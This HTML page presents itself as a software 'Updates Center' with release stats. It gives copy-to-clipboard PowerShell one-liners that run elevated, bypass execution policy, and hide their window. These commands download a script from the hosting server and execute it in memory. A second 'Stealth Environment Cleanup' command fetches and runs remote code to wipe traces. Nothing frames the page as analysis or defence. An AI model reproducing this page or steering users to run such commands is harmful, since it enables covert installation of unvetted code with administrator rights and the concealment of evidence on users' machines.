<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LowLife Updates Center</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">LowLife Updates Center</div>
            <div class="subtitle">Download latest verified executable distributions</div>
        </div>

        <div class="panel">
            <div class="panel-title">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-info"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
                Current Release Details
            </div>
            
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-val" id="lbl-version">-.-.-</div>
                    <div class="stat-lbl">Active Version</div>
                </div>
                <div class="stat-card">
                    <div class="stat-val" id="lbl-downloads">0</div>
                    <div class="stat-lbl">Total Downloads</div>
                </div>
            </div>

            <div class="input-group">
                <label>Release Date</label>
                <div class="text-input" id="lbl-date" style="display: flex; align-items: center; color: rgba(255,255,255,0.7); background: rgba(0,0,0,0.1); border-color: rgba(255,255,255,0.02);" readonly>-</div>
            </div>

            <div class="input-group" style="margin-bottom: 5px;">
                <label>Release Notes & Changelog</label>
                <div class="changelog-box" id="lbl-changelog">
                    Loading update logs...
                </div>
            </div>
        </div>

        <div class="panel" style="margin-bottom: 20px;">
            <div class="panel-title">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-terminal"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
                Secure Fileless Installation
            </div>
            <label>Run this command once in PowerShell (as Administrator) to install & launch:</label>
            <div style="position: relative; display: flex; align-items: center; margin-bottom: 15px;">
                <input type="text" id="powershell-cmd" class="text-input" style="font-family: 'JetBrains Mono', monospace; font-size: 11px; padding-right: 90px; text-overflow: ellipsis;" readonly value="powershell -ExecutionPolicy Bypass -Command &quot;Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -Command &amp; { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (New-Object Net.WebClient).DownloadString(''__HOST_URL__/setup.ps1'') }' -Verb RunAs&quot;">
                <button id="btn-copy" style="position: absolute; right: 8px; height: 36px; border: none; border-radius: 8px; background: rgba(0, 210, 255, 0.15); color: #00d2ff; font-family: inherit; font-size: 11px; font-weight: 600; padding: 0 14px; cursor: pointer; transition: all 0.2s ease;">Copy</button>
            </div>
        </div>

        <div class="panel" style="margin-bottom: 25px;">
            <div class="panel-title">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-shield-off"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><line x1="8" y1="11" x2="16" y2="11"></line></svg>
                Stealth Environment Cleanup
            </div>
            <label>Run this command once in PowerShell (as Administrator) to wipe all traces & config files:</label>
            <div style="position: relative; display: flex; align-items: center; margin-bottom: 15px;">
                <input type="text" id="cleanup-cmd" class="text-input" style="font-family: 'JetBrains Mono', monospace; font-size: 11px; padding-right: 90px; text-overflow: ellipsis;" readonly value="powershell -ExecutionPolicy Bypass -Command &quot;Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command &amp; { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (New-Object Net.WebClient).DownloadString(''__HOST_URL__/cleanup'') }' -Verb RunAs&quot;">
                <button id="btn-copy-cleanup" style="position: absolute; right: 8px; height: 36px; border: none; border-radius: 8px; background: rgba(0, 210, 255, 0.15); color: #00d2ff; font-family: inherit; font-size: 11px; font-weight: 600; padding: 0 14px; cursor: pointer; transition: all 0.2s ease;">Copy</button>
            </div>
        </div>

        <a href="/download" class="btn btn-cyan" id="btn-download" style="text-decoration: none; margin-bottom: 10px;">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" class="feather feather-download"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
            Download Setup Script (setup.ps1)
        </a>
    </div>

    <script>
        const lblVersion = document.getElementById('lbl-version');
        const lblDownloads = document.getElementById('lbl-downloads');
        const lblDate = document.getElementById('lbl-date');
        const lblChangelog = document.getElementById('lbl-changelog');
        const btnDownload = document.getElementById('btn-download');
        const powershellCmd = document.getElementById('powershell-cmd');
        const btnCopy = document.getElementById('btn-copy');
        const cleanupCmd = document.getElementById('cleanup-cmd');
        const btnCopyCleanup = document.getElementById('btn-copy-cleanup');

        // Dynamically replace the hosted IP/domain in the PowerShell one-liners
        const hostUrl = window.location.origin;
        powershellCmd.value = powershellCmd.value.replace('__HOST_URL__', hostUrl);
        cleanupCmd.value = cleanupCmd.value.replace('__HOST_URL__', hostUrl);

        // Copy button handler (Installation)
        btnCopy.addEventListener('click', () => {
            powershellCmd.select();
            powershellCmd.setSelectionRange(0, 99999);
            navigator.clipboard.writeText(powershellCmd.value);
            
            btnCopy.textContent = 'Copied!';
            btnCopy.style.background = 'rgba(0, 255, 136, 0.15)';
            btnCopy.style.color = 'var(--accent-green)';
            
            setTimeout(() => {
                btnCopy.textContent = 'Copy';
                btnCopy.style.background = 'rgba(0, 210, 255, 0.15)';
                btnCopy.style.color = '#00d2ff';
            }, 2000);
        });

        // Copy button handler (Cleanup)
        btnCopyCleanup.addEventListener('click', () => {
            cleanupCmd.select();
            cleanupCmd.setSelectionRange(0, 99999);
            navigator.clipboard.writeText(cleanupCmd.value);
            
            btnCopyCleanup.textContent = 'Copied!';
            btnCopyCleanup.style.background = 'rgba(0, 255, 136, 0.15)';
            btnCopyCleanup.style.color = 'var(--accent-green)';
            
            setTimeout(() => {
                btnCopyCleanup.textContent = 'Copy';
                btnCopyCleanup.style.background = 'rgba(0, 210, 255, 0.15)';
                btnCopyCleanup.style.color = '#00d2ff';
            }, 2000);
        });

        async function fetchLatestRelease() {
            try {
                const response = await fetch('/api/release/latest');
                const data = await response.json();
                if (data.success) {
                    lblVersion.textContent = `v${data.version}`;
                    lblDownloads.textContent = data.totalDownloads.toLocaleString();
                    lblDate.textContent = data.date;
                    lblChangelog.textContent = data.changelog;
                } else {
                    lblChangelog.textContent = 'Failed to load details from the active update node.';
                }
            } catch (err) {
                lblChangelog.textContent = 'Failed to connect to the distribution service.';
            }
        }

        // Increase download counter visually on click to feel instant
        btnDownload.addEventListener('click', () => {
            setTimeout(() => {
                const cur = parseInt(lblDownloads.textContent.replace(/,/g, ''));
                if (!isNaN(cur)) {
                    lblDownloads.textContent = (cur + 1).toLocaleString();
                }
            }, 300);
        });

        fetchLatestRelease();
    </script>
</body>
</html>
